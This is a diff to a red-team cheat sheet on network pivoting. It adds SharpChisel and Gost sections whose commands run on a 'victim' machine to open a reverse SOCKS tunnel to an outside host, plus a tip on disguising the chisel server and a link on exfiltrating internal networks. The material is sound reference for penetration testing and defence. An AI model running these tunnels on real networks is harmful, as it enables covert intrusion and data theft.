@@ -12,6 +12,8 @@
 * [Metasploit](#metasploit)
 * [sshuttle](#sshuttle)
 * [chisel](#chisel)
+  * [SharpChisel](#sharpchisel)
+* [gost](#gost)
 * [Rpivot](#rpivot)
 * [RevSocks](#revsocks)
 * [plink](#plink)
@@ -170,6 +172,40 @@ user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:
 user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
 ```
 
+### SharpChisel
+
+A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel
+
+```powershell
+user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
+================================================================
+server : run the Server Component of chisel 
+-p 8080 : run server on port 8080
+--key "private": use "private" string to seed the generation of a ECDSA public and private key pair
+--auth "user:pass" : Creds required to connect to the server
+--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
+--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.
+
+user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
+```
+
+## Gost
+
+> Wiki English : https://docs.ginuerzh.xyz/gost/en/
+
+```powershell
+git clone https://github.com/ginuerzh/gost
+cd gost/cmd/gost
+go build
+
+# Socks5 Proxy
+Server side: gost -L=socks5://:1080
+Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true
+
+# Local Port Forward
+gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
+```
+
 ## Rpivot
 
 Server (Attacker box)
@@ -306,3 +342,4 @@ unzip ngrok-stable-linux-amd64.zip
 * [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
 * [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
 * [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre Zanni](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
+* [Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
